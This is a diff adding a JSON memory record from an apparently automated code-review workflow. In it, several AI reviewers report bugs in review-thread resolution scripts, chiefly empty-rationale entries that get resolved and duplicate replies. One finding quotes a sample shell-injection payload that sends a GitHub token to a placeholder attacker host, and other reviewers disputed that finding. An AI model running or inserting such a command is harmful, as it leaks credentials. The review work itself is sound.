@@ -1,0 +1,39 @@
+{
+  "category": "patterns",
+  "confidence": 0.7,
+  "details": "=== CONSENSUS FINDINGS ===\n- scripts/review_resolve_review_threads_plan.py:128-138, 281-290; scripts/review_resolve_review_threads.sh:286 | severity=major | confidence=5\n  flagged_by: [deepseek_deepseek-v4-pro, minimax_minimax-m3, moonshotai_kimi-k3, qwen_qwen3_7-plus, x-ai_grok-4_6]\n  PROBLEM: Empty-rationale ignored audit entries are planned, receive the \u201cno reason recorded\u201d placeholder, and still resolve the thread.\n  WHY: This closes rejected findings without an actionable justification, contrary to the required empty-rationale rejection.\n- scripts/review_resolve_review_threads_plan.py:252-290; scripts/review_resolve_review_threads.sh:263-310 | severity=major | confidence=4\n  flagged_by: [deepseek_deepseek-v4-pro, minimax_minimax-m3, moonshotai_kimi-k3, qwen_qwen3_7-plus]\n  PROBLEM: The plan does not deduplicate entries by thread_id, while the driver uses a stale pre-loop resolution_reply_posted snapshot.\n  WHY: Multiple audited entries for one thread can post duplicate rationale replies and reissue resolveReviewThread; severity was rated MAJOR by some reviewers and NIT by others.\n\n=== END CONSENSUS FINDINGS ===\n\n=== CONSENSUS TASK GAPS ===\n(No task gaps reported.)\n=== END CONSENSUS TASK GAPS ===\n\n=== FINDINGS FROM deepseek_deepseek-v4-pro ===\n- scripts/review_resolve_review_threads_plan.py:128-138, 281-290; scripts/review_resolve_review_threads.sh:286 | severity=MAJOR | confidence=4\n  PROBLEM: An ignored audit entry with no rationale is not rejected and is resolved with \u201cno reason recorded\u201d.\n  WHY: An editor line such as \"- entry[3] Copilot \u2014 path \u2014 ignored\" resolves the reviewer\u2019s thread without an actionable reason.\n- scripts/review_resolve_review_threads_plan.py:252-290; scripts/review_resolve_review_threads.sh:263-310 | severity=MAJOR | confidence=3\n  PROBLEM: The plan emits duplicate rows for the same thread_id and the driver cannot observe a reply posted earlier in the loop.\n  WHY: Two ignored entries in one thread post two rationale replies and run resolveReviewThread twice.\n\n=== END FINDINGS FROM deepseek_deepseek-v4-pro ===\n\n=== FINDINGS FROM minimax_minimax-m3 ===\n- scripts/review_resolve_review_threads.sh:285-293; scripts/review_resolve_review_threads_plan.py:128-138,167 | severity=BLOCKER | confidence=5\n  PROBLEM: The review rationale is interpolated into a double-quoted command-substitution string, allegedly allowing reviewer-controlled shell command execution.\n  WHY: A reviewer payload containing `$(curl http://attacker/exfil?token=$GH_TOKEN)` was claimed to execute while constructing reply_body; this finding was rejected as a false positive by moonshotai_kimi-k3 and qwen_qwen3_7-plus.\n- scripts/review_resolve_review_threads_plan.py:252-292; scripts/review_resolve_review_threads.sh:263-310 | severity=MAJOR | confidence=4\n  PROBLEM: Empty or whitespace-only ignored rationales are accepted, replaced with \u201cno reason recorded\u201d, and resolved.\n  WHY: The reviewer sees a closed thread with no information about the disagreement.\n- scripts/review_resolve_review_threads_plan.py:281-290; scripts/review_resolve_review_threads.sh:263-310 | severity=MAJOR | confidence=4\n  PROBLEM: Duplicate thread_id plan rows combined with the stale pre-loop snapshot cause duplicate replies and repeated resolution mutations.\n  WHY: Two audited entries for one thread independently post rationale replies and resolve the same thread.\n\n=== END FINDINGS FROM minimax_minimax-m3 ===\n\n=== FINDINGS FROM mistralai_mistral-small-2603 ===\n(No findings reported.)\n=== END FINDINGS FROM mistralai_mistral-small-2603 ===\n\n=== FINDINGS FROM moonshotai_kimi-k3 ===\n- scripts/review_resolve_review_threads.sh:272-310; scripts/review_resolve_review_threads_plan.py:281-300 | severity=NIT | confidence=4\n  PROBLEM: The plan does not deduplicate rows by thread_id and the driver reads the duplicate-suppression flag from a pre-loop snapshot.\n  WHY: Duplicate rationale replies accumulate on one thread within a single run.\n- scripts/review_resolve_review_threads.sh:286; scripts/review_resolve_review_threads_plan.py:252-292 | severity=NIT | confidence=4\n  PROBLEM: An ignored audit entry with an empty rationale is accepted and resolved with \u201cno reason recorded\u201d.\n  WHY: A rejection without a rationale misleads the reviewer about why the suggestion was dismissed.\n\n=== END FINDINGS FROM moonshotai_kimi-k3 ===\n\n=== FINDINGS FROM qwen_qwen3_7-plus ===\n- scripts/review_resolve_review_threads_plan.py:252-291; scripts/review_resolve_review_threads_plan.py:128-138 | severity=MAJOR | confidence=5\n  PROBLEM: Empty-rationale ignored entries are appended to the plan and resolved with the \u201cno reason recorded\u201d placeholder.\n  WHY: The intended guard to leave such threads open was not implemented.\n- scripts/review_resolve_review_threads_plan.py:281-291; scripts/review_resolve_review_threads.sh:282-305 | severity=NIT | confidence=4\n  PROBLEM: Duplicate thread_id plan rows combined with the stale resolution_reply_posted snapshot produce duplicate replies.\n  WHY: The first row resolves the thread, but the second still sees resolution_reply_posted=false.\n\n=== END FINDINGS FROM qwen_qwen3_7-plus ===\n\n=== FINDINGS FROM x-ai_grok-4_6 ===\n- scripts/review_resolve_review_threads.sh:286; scripts/review_resolve_review_threads_plan.py:128-138, 281-290 | severity=MAJOR | confidence=4\n  PROBLEM: An ignored audit line without a trailing rationale is planned and resolved with the \u201cno reason recorded\u201d placeholder.\n  WHY: A rejected finding is closed without a real editor reason, contrary to the claimed empty-rationale guard.\n\n=== END FINDINGS FROM x-ai_grok-4_6 ===",
+  "fingerprint": "620e1f497e386f1a8c7eaf2191023c70518416d9118fffe183cc1b4a2d740c9c",
+  "lineage": {
+    "issue_number": null,
+    "parent_ids": [],
+    "pr_number": 3841,
+    "run_id": "33036786819",
+    "superseded_by": null,
+    "supersedes": null
+  },
+  "provenance": {
+    "actor": "shubhodeep1",
+    "run_attempt": 1,
+    "run_id": "33036786819",
+    "source_refs": [
+      "reviewer_consensus.txt"
+    ],
+    "workflow": "review_autofix"
+  },
+  "record_id": "mem_20260827044142_c9c235e373",
+  "schema_version": "memory_record.v1",
+  "scope": {
+    "issue_number": null,
+    "level": "run",
+    "pr_number": 3841,
+    "run_id": "33036786819"
+  },
+  "sensitive": false,
+  "status": "candidate",
+  "summary": "Reviewer consensus flagged 2 multi-reviewer item(s) across 2 total consensus item(s)",
+  "timestamps": {
+    "created_at": "2026-08-27T04:41:42Z",
+    "promoted_at": null,
+    "superseded_at": null
+  }
+}
